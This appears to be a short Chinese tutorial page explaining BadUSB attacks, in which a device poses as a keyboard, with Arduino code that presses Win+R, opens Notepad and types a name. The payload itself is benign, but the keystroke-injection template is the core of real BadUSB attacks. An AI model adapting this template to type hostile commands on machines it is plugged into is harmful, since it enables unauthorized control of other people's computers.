# BADUSB攻击

## 什么是BADUSB攻击

计算机或者其它设备"承认"我们插入的硬件为键盘鼠标，硬件版本模拟键盘鼠标操作。

<DocsAD/>

## BADUSB代码

```JS
#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  delay(3000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("notepad");

  delay(500);

  typeKey(KEY_RETURN);

  delay(750);

  Keyboard.print("DeeLMind");

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
```